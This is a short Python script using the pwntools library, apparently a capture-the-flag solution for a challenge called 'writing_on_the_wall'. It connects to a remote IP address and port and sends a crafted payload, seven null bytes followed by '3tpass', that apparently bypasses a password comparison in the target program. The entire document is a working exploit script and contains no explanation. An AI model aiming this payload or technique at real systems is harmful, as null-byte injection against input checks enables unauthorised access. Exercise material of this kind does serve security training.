#!/bin/python3

from pwn import *

#io = process('./writing_on_the_wall')
io = remote ('83.136.252.62', 48236)

payload = (b'\x00' * 7) + b'3tpass'
#print(payload)

io.sendlineafter('>>', payload)
io.stream()
io.close()
